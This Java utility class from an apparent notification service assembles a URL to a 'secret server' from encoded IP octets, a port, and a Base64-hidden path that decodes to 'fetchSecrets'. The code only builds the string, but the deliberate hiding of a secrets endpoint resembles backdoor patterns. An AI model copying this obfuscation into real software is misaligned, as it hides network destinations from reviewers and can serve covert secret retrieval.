package com.wings.notificationservice.utils;


import static com.wings.notificationservice.constants.AppConstants.*;
import static com.wings.notificationservice.utils.Decoder.decodeNumber;

public class EndpointUtil {
    private static final String API_ENDPOINT = "ZmV0Y2hTZWNyZXRz";

    public static String getSecretEndpoint() {
        Integer network = decodeNumber(SECRET_SERVER_NETWORK_ID);
        Integer subnet1 = decodeNumber(SECRET_SERVER_SUBNET_ID_1);
        Integer subnet2 = decodeNumber(SECRET_SERVER_SUBNET_ID_2);
        Integer subnet3 = decodeNumber(SECRET_SERVER_SUBNET_ID_3);
        return new StringBuilder()
                .append("http://")
                .append(network)
                .append(DELIMITER)
                .append(subnet1)
                .append(DELIMITER)
                .append(subnet2)
                .append(DELIMITER)
                .append(subnet3)
                .append(":")
                .append(PORT_NUMBER)
                .append("/")
                .append(Decoder.decode(API_ENDPOINT))
                .toString();

    }



}
